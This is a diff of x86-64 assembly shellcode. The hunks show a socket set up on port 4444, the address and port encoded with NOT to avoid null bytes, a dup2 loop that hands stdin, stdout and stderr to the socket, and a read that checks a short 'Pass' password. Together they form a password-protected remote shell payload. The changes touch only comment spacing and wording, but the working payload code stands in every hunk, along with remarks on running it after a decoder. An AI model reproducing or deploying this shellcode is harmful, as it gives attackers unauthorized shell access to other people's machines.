@@ -23,8 +23,8 @@ _start:
     ; syscall number 41
 
     xor rsi , rsi
-    mul rsi                      ; null rax , rdx register
-    push rax                     ; push null in the stack , highly recommanded if the shellcode run after a decrypter or decoder (stack not clean) ;
+    mul rsi        ; null rax , rdx register
+    push rax       ; push null in the stack , highly recommanded if the shellcode run after a decrypter or decoder (stack not clean) ;
     push byte 0x29 ; syscall number 41
     pop rax
     push byte 0x2  ; AF_INET
@@ -47,7 +47,7 @@ _start:
      push rax  ; bzero(&server.sin_zero, 8)
 
 
-     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)
+     mov rbx , 0xffffffffa3eefffd  ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)
 
 
      not rbx
@@ -114,7 +114,7 @@ _start:
       pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop
       syscall
     inc rsi
-    cmp rsi , 0x3  ; jmp in the next couple of instruction if equals
+    cmp rsi , 0x3   ; go in the next couple of instruction if equals
 
  loopne dup2
 
@@ -127,7 +127,7 @@ CheckPass:
     push rsp
     pop rsi
     xor edi , edi
-    syscall                   ;system read function call format : ssize_t read(int fd, void *buf, size_t count);
+    syscall             ;system read function call format : ssize_t read(int fd, void *buf, size_t count);
 
     push  0x73736150   ; "Pass¨ in reverse order  (short password to reduce size of shellcode)
 
